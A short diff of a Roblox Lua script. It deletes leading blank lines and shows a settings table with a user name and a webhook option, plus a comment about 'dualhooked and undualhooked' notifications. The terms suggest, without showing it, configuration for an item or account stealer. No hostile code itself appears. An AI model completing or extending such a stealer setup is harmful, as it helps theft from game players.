@@ -1,17 +1,3 @@
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 getgenv().Settings = {
     User = "dlazdi123",
     Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
